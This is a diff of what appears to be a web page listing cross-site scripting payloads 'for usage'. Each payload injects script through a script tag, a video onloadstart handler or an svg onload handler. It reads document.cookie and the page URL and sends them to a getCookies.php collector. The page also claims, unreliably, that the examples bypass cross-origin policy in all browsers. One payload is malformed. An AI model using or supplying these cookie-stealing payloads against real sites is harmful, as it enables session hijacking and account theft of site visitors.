@@ -4,10 +4,13 @@
 
 <p>Here same payload examples for usage.</p>
 
-<sCRiPt>new Image().src="https://localhost/getCookies.php?u="+document.location.href+"&c="+document.cookie;</sCRiPt>
-<video autoplay onloadstart="new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;" src=x></video>
+    <sCRiPt>new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;</sCRiPt>
 
+    <svgonload=setTimeout(function(a){a=document.createElement(`img`);a.src=`https://localhost/getCookies.php?       u=${document.location.href}&c=${document.cookie}`;document.getElementsByTagName(`body`)[0].appendChild(a);},500);>
 
+    <video autoplay onloadstart="new Image().src=`https://localhost/getCookies.php?u=${document.location.href}&c=${document.cookie}`;" src=x></video>
+
+    <sCRiPt>new Image().src="https://localhost/getCookies.php?u="+document.location.href+"&c="+document.cookie;</sCRiPt>
 
 <p>These examples in above is written for bypassing cross site origin policy in all browsers but you can use your own payload instead.</p>
 
